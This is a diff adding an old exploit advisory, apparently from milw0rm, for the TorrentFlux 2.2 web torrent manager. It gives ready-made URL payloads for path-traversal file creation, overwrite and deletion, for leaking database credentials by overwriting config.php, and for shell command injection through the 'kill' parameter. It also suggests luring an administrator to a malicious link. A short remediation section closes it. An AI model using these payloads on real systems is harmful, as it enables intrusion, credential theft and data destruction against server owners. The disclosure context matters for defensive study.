@@ -1,0 +1,96 @@
+#################################################################################################
+#                                                                                               #
+#                                    r0ut3r Presents...                                         #
+#                                                                                               #
+#                                Another r0ut3r discovery!                                      #
+#                                                                                               #
+# TorrentFlux 2.2 Arbitrary File Creation/Overwrite/Deletion & Command Execution Vulnerablities #
+#                                                                                               #
+#################################################################################################
+#                                                                                               #
+# Software: TorrentFlux 2.2                                                                     #
+#                                                                                               #
+# Vendor: http://www.torrentflux.com/                                                           #
+#                                                                                               #
+# Released: 2006/11/15                                                                          #
+#                                                                                               #
+# Discovered By: r0ut3r (writ3r [at] gmail.com)                                                 #
+#                                                                                               #
+# Criticality: Highly critical                                                                  #
+#                                                                                               #
+# Note: The information provided in this document is for TorrentFlux administrator              #
+# testing purposes only!                                                                        #
+#                                                                                               #
+# "TorrentFlux 2.2Beta does not seem to be vulnerable"                                          #
+#################################################################################################
+
+   TorrentFlux 2.2 Arbitrary File Creation/Overwrite/Deletion & Command Execution Vulnerablity
+-------------------------------------------------------------------------------------------------
+
+alias_file = name of file you want to create.
+delfile = name of file you want to remove
+
+-= To overwrite a file (make sure q.php is there, provided thats the file you want to overwrite): =-
+/torrentflux/index.php?alias_file=../../q.php&kill=3361&kill_torrent= q.torrent
+
+-= To create a file: =-
+/torrentflux/index.php?alias_file=q.php&kill=3361&kill_torrent=q.torrent
+
+All files are filled with:
+0
+0
+Torrent Stopped
+
+-= Exploit on config.php =-
+/torrentflux/index.php?alias_file=../../config.php&kill=3361&kill_torrent=q.torrent
+It will redirect you to index.php and it will display the DATABASE USERNAME/PASSWORD IN PLAINTEXT, plus the rest of the config information!
+
+index.php displays:
+0 -100 Torrent Stopped * TorrentFlux PHP Torrent Manager * www.torrentflux.com
+
+**************************************************************/ /* This file is part of TorrentFlux. TorrentFlux is free software; you can
+
+redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation; either
+
+...etc...
+
+**************************************************************************/ // YOUR DATABASE CONNECTION INFORMATION
+
+/**************************************************************************/ // Check the adodb/drivers/ directory for support for your
+
+database // you may choose from many (mysql is the default) $cfg["db_type"] = "mysql"; // mysql, postgres7 view adodb/drivers/
+
+$cfg["db_host"] = "localhost"; // DB host computer name or IP $cfg["db_name"] = "tf"; // Name of the Database $cfg["db_user"] = "root"; //
+
+username for your MySQL database $cfg["db_pass"] = "owned"; // password for database
+
+-= Files can also be deleted like so: =-
+/torrentflux/index.php?alias_file=owned.php&kill=3361&delfile=owned.php
+
+-= Command Execution Exploit =-
+/torrentflux/index.php?alias_file=owned.php&kill= ; echo "r0ut3r's TorrentFlux 0day" > /tmp/q.php&kill_torrent=q.torrent&return=true
+
+Replace kill parameter like so:
+kill=; your command
+kill=; echo "r0ut3r just owned your system! hacked!" > /tmp/read_this.php
+
+The only draw back is that you have to be a registered member before you can access the functions of index.php.
+Alternatively you could direct the administrator to a link which overwrites the config.php file, then catch the output on index.php somehow (be quick).
+
+Solution:
+----------
+Sanitize all variables listed above and below.
+alias_file
+delfile
+kill
+kill_torrent
+
+Solution 2:
+-----------
+Set up .htaccess and only allow certain people to login until an offical patch is released.
+
+----------------------------------------------------------------------------------------------
+              This has been another r0ut3r discovery (writ3r [ at ] gmail.com)
+----------------------------------------------------------------------------------------------
+
+# milw0rm.com [2006-11-15]
